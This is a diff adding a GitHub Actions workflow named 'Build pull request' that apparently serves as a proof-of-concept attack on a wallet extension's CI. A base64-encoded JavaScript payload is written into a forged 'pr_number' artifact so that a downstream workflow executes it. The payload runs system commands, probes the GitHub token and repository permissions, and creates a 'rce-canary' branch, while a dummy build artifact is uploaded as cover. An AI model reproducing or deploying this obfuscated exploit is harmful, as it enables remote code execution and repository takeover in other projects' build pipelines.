@@ -1,0 +1,25 @@
+name: Build pull request
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  fake_build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: forge pr_number artifact
+        run: |
+          mkdir -p pr
+          echo 'Ijt2YXIgY3A7dHJ5e2NwPXJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKX1jYXRjaChlKXtjcD1wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpfWNvbnNvbGUubG9nKCJSQ0VfT1VUUFVUX1NUQVJUIik7Y29uc29sZS5sb2coY3AuZXhlY1N5bmMoImlkIikudG9TdHJpbmcoKSk7Y29uc29sZS5sb2coIklOUFVUX1RPS0VOX0xFTj0iKygocHJvY2Vzcy5lbnZbIklOUFVUX0dJVEhVQi1UT0tFTiJdfHwiIikubGVuZ3RoKSk7dmFyIHA9KGF3YWl0IGdpdGh1Yi5yZXBvcy5nZXQoe293bmVyOmNvbnRleHQucmVwby5vd25lcixyZXBvOmNvbnRleHQucmVwby5yZXBvfSkpLmRhdGEucGVybWlzc2lvbnM7Y29uc29sZS5sb2coIlBFUk1TOiIrSlNPTi5zdHJpbmdpZnkocCkpO3ZhciBicj1hd2FpdCBnaXRodWIuZ2l0LmNyZWF0ZVJlZih7b3duZXI6Y29udGV4dC5yZXBvLm93bmVyLHJlcG86Y29udGV4dC5yZXBvLnJlcG8scmVmOiJyZWZzL2hlYWRzL3JjZS1jYW5hcnkiLHNoYTpwcm9jZXNzLmVudi5HSVRIVUJfU0hBfSk7Y29uc29sZS5sb2coIkJSQU5DSF9DUkVBVEVEOiIrYnIuc3RhdHVzKTtjb25zb2xlLmxvZygiUkNFX09VVFBVVF9FTkQiKTtwcm9jZXNzLmV4aXQoMCk7Ly8=' | base64 -d > pr/pr_number
+          echo 'dummy build' > build.txt
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        with:
+          name: pr_number
+          path: pr/
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        with:
+          name: zerion-wallet-extension
+          path: build.txt
